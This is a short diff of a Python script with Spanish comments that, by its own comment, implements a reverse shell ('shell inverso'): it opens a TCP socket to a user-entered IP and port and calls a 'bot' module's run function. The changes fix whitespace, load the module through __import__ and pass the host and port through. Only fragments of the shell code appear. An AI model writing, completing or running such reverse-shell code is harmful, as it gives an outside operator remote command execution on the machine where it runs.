@@ -1,6 +1,6 @@
 import socket
-import subprocess 
- 
+import subprocess
+
 def run(ip, port):
     # Crear un socket TCP
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -33,10 +33,10 @@ def main():
     port = int(input("Introduzca el puerto: "))
 
     # Importar el módulo bot
-    import bot
+    bot = __import__("bot")
 
     # Ejecutar la función de shell inverso
-    bot.run()
+    bot.run(ip, port)
 
 if __name__ == "__main__":
     main()
